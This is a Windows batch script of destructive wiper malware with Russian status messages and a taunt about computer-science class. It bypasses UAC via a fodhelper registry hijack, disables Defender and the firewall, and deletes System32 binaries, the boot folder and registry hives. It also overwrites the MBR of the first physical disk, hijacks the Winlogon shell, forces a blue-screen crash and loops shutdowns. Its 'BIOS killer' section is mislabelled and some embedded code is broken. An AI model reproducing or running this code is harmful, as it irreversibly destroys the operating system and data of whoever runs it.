@echo off
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /d "%~f0" /f >nul 2>&1
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /f >nul 2>&1
fodhelper.exe >nul 2>&1
timeout /t 1 /nobreak >nul

powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true" >nul 2>&1
netsh advfirewall set allprofiles state off >nul

echo УНИЧТОЖЕНИЕ BIOS И WINDOWS...
powershell -Command "
Add-Type @'
using System;
using System.Runtime.InteropServices;
public class BIOSKiller {
    [DllImport(\"kernel32.dll\", SetLastError=true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
    
    [DllImport(\"kernel32.dll\", SetLastError=true)]
    public static extern IntPtr LoadLibrary(string lpFileName);
    
    [DllImport(\"kernel32.dll\", SetLastError=true)]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    
    public static void KillBIOS() {
        try {
            IntPtr hModule = LoadLibrary(\"kernel32.dll\");
            IntPtr addr = GetProcAddress(hModule, \"GetSystemFirmwareTable\");
            uint oldProtect;
            VirtualProtect(addr, (UIntPtr)5, 0x40, out oldProtect);
            byte[] patch = {0xC3};
            Marshal.Copy(patch, 0, addr, 1);
        } catch {}
    }
}
'@
[BIOSKiller]::KillBIOS()
" >nul 2>&1

echo СНОС WINDOWS...
takeown /f C:\Windows\* /r /d y >nul 2>&1
icacls C:\Windows\*.* /grant everyone:F /t /c /q >nul 2>&1

del /f /s /q C:\Windows\System32\*.dll >nul 2>&1
del /f /s /q C:\Windows\System32\*.exe >nul 2>&1
del /f /s /q C:\Windows\System32\*.sys >nul 2>&1
rmdir /s /q C:\Windows\Boot >nul 2>&1
rmdir /s /q C:\Windows\System32\config >nul 2>&1

echo ПОВРЕЖДЕНИЕ MBR/GPT...
powershell -Command "
$drive = Get-WmiObject Win32_DiskDrive | Where-Object {$_.DeviceID -match 'PHYSICALDRIVE0'}
if($drive) {
    $mbr = New-Object byte[] 512
    0..511 | % {$mbr[$_] = 0xFF}
    $stream = [System.IO.File]::OpenWrite(\"\\\\.\\PHYSICALDRIVE0\")
    $stream.Write($mbr, 0, 512)
    $stream.Close()
}
" >nul 2>&1

echo НАСТРОЙКА КРАСНОГО ЭКРАНА ПРИ ЗАГРУЗКЕ...
powershell -Command "
$vbsCode = @'
Set video = CreateObject(\"WMPlayer.OCX\")
video.url = \"about:blank\"
video.stretchToFit = true
video.windowless = true
video.enableContextMenu = false
Set shell = CreateObject(\"WScript.Shell\")
Set fso = CreateObject(\"Scripting.FileSystemObject\")
vbsFile = fso.GetSpecialFolder(2) & \"\\boot.vbs\"
fso.CreateTextFile(vbsFile, True).Write vbsCode
shell.RegWrite \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\BootScreen\", \"wscript.exe \"\"\" & vbsFile & \"\"\"\", \"REG_SZ\"
'@
$path = \"$env:TEMP\\boot.vbs\"
Set-Content -Path \$path -Value \$vbsCode -Force
wscript.exe \$path
" >nul 2>&1

reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "cmd.exe /c echo ФИГ ТЕБЕ а НЕ ИНФОРМАТИКА ЛОХ!!! && pause && shutdown -s -f -t 0" /f >nul 2>&1

echo СОЗДАНИЕ RED SCREEN...
powershell -Command "
Add-Type @'
using System;
using System.Runtime.InteropServices;
public class RedScreen {
    [DllImport(\"user32.dll\")]
    public static extern IntPtr GetDC(IntPtr hwnd);
    
    [DllImport(\"user32.dll\")]
    public static extern int ReleaseDC(IntPtr hwnd, IntPtr hDC);
    
    [DllImport(\"gdi32.dll\")]
    public static extern bool PatBlt(IntPtr hdc, int nXLeft, int nYLeft, int nWidth, int nHeight, uint dwRop);
    
    [DllImport(\"user32.dll\")]
    public static extern bool DrawText(IntPtr hdc, string text, int len, ref RECT rect, uint format);
    
    [StructLayout(LayoutKind.Sequential)]
    public struct RECT {
        public int Left; public int Top; public int Right; public int Bottom;
    }
    
    public static void Show() {
        IntPtr hdc = GetDC(IntPtr.Zero);
        PatBlt(hdc, 0, 0, 5000, 5000, 0x00F00021);
        RECT rect = new RECT { Left = 100, Top = 300, Right = 1900, Bottom = 800 };
        DrawText(hdc, \"ФИГ ТЕБЕ а НЕ ИНФОРМАТИКА ЛОХ!!!\", -1, ref rect, 0x00000001 | 0x00001000);
        ReleaseDC(IntPtr.Zero, hdc);
    }
}
'@
[RedScreen]::Show()
" >nul 2>&1

echo ВЫКЛЮЧЕНИЕ КОМПЬЮТЕРА...
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Power" /v HiberbootEnabled /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\CrashControl" /v CrashDumpEnabled /t REG_DWORD /d 0 /f >nul 2>&1

shutdown -s -f -t 3 -c "ФИГ ТЕБЕ а НЕ ИНФОРМАТИКА ЛОХ!!!"
timeout /t 5 >nul

powershell -Command "
$code = @'
[DllImport(\"ntdll.dll\")]
public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);
[DllImport(\"ntdll.dll\")]
public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);
'@
Add-Type -MemberDefinition \$code -Name Win32 -Namespace NtDll
$prev = $false
[NtDll.Win32]::RtlAdjustPrivilege(19, $true, $false, [ref]\$prev)
$response = 0
[NtDll.Win32]::NtRaiseHardError(0xc0000420, 0, 0, [IntPtr]::Zero, 6, [ref]\$response)
" >nul 2>&1

:force_shutdown
wmic os where primary=1 call shutdown
goto force_shutdown
